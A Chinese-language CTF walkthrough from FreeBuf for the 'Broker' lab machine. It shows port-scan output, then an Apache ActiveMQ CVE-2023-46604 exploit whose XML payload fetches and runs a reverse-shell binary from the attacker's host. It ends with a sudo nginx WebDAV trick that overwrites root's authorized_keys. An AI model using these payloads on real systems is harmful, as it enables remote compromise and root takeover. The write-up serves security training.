---
title: [Meachines] [Easy] Broker Apache MQ RCE+Nginx ngx_http_dav_module权限提升
url: https://www.freebuf.com/articles/web/421542.html
source: FreeBuf网络安全行业门户
date: 2025-02-13
fetch_date: 2025-10-06T20:35:05.441113
---

# [Meachines] [Easy] Broker Apache MQ RCE+Nginx ngx_http_dav_module权限提升

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

[Meachines] [Easy] Broker Apache MQ RCE+Nginx ngx\_http\_dav\_module权限提升

* ![]()
* 关注

* [Web安全](https://www.freebuf.com/articles/web)

[Meachines] [Easy] Broker Apache MQ RCE+Nginx ngx\_http\_dav\_module权限提升

2025-02-12 11:38:20

所属地 福建省

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

# Information Gathering

| IP Address | Opening Ports |
| --- | --- |
| 10.10.11.243 | **TCP**:22,80,1883,5672,8161,38507,61613,61614,61616 |

`$ ip='10.10.11.243'; itf='tun0'; if nmap -Pn -sn "$ip" | grep -q "Host is up"; then echo -e "\e[32m[+] Target $ip is up, scanning ports...\e[0m"; ports=$(sudo masscan -p1-65535,U:1-65535 "$ip" --rate=1000 -e "$itf" | awk '/open/ {print $4}' | cut -d '/' -f1 | sort -n | tr '\n' ',' | sed 's/,$//'); if [ -n "$ports" ]; then echo -e "\e[34m[+] Open ports found on $ip: $ports\e[0m"; nmap -Pn -sV -sC -p "$ports" "$ip"; else echo -e "\e[31m[!] No open ports found on $ip.\e[0m"; fi; else echo -e "\e[31m[!] Target $ip is unreachable, network is down.\e[0m"; fi`

```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: nginx/1.18.0 (Ubuntu)
1883/tcp  open  mqtt
| mqtt-subscribe:
|   Topics and their most recent payloads:
|_    ActiveMQ/Advisory/Consumer/Topic/#:
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: Jetty(9.4.39.v20210325)
38507/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings:
|   HELP4STOMP:
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title.
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Jetty(9.4.39.v20210325)
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings:
|   NULL:
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion
|_    5.15.15
```

# Apache MQ RCE

![image.png](https://image.3001.net/images/20250211/1739271695_67ab2e0fc217ae70fcf19.png!small)

`$ wget https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ/archive/refs/heads/main.zip`

```
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>sh</value>
            <value>-c</value>
            <!-- The command below downloads the file and saves it as test.elf -->
	    <value>curl -s -o reverse http://10.10.16.28/reverse; chmod +x ./reverse; ./reverse</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```

`$ go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.16.28:9999/poc-linux.xml`

![image-1.png](https://image.3001.net/images/20250211/1739271689_67ab2e09bdca425d1308f.png!small)

## User.txt

> a178c399b0c91839399aa5b98c0c117c

# Privilege Escalation: Nginx ngx\_http\_dav\_module

![image-2.png](https://image.3001.net/images/20250211/1739271739_67ab2e3bdedb761ccc992.png!small)

```
$ cat << EOF> /tmp/shell.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;

events {
    worker_connections 768;
}

http {
    server {
        listen 10031;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
EOF
```

`$ sudo nginx -c /tmp/shell.conf`

![image-3.png](https://image.3001.net/images/20250211/1739271744_67ab2e407d8cdd791fa1b.png!small)

![image-4.png](https://image.3001.net/images/20250211/1739271748_67ab2e44c84e286d79852.png!small)

`$ ssh-keygen`

![image-6.png](https://image.3001.net/images/20250211/1739271752_67ab2e48b7724bd16c6ee.png!small)

`$ curl -X PUT http://10.10.11.243:10031/root/.ssh/authorized_keys -d @/home/maptnh/.ssh/id_ed25519.pub`

`$ ssh root@10.10.11.243 -i /home/maptnh/.ssh/id_ed25519`

![image-7.png](https://image.3001.net/images/20250211/1739271757_67ab2e4d94adadbd044ab.png!small)

## Root.txt

> 26eecd6da62a87d2098e474929f93140

# web安全 # CTF

免责声明

1.一般免责声明：本文所提供的技术信息仅供参考，不构成任何专业建议。读者应根据自身情况谨慎使用且应遵守《中华人民共和国网络安全法》，作者及发布平台不对因使用本文信息而导致的任何直接或间接责任或损失负责。

2. 适用性声明：文中技术内容可能不适用于所有情况或系统，在实际应用前请充分测试和评估。若因使用不当造成的任何问题，相关方不承担责任。

3. 更新声明：技术发展迅速，文章内容可能存在滞后性。读者需自行判断信息的时效性，因依据过时内容产生的后果，作者及发布平台不承担责任。

![]()

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
已在FreeBuf发表 0 篇文章

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

User.txt

Root.txt

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

* [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)

### FreeBuf知识大陆

![...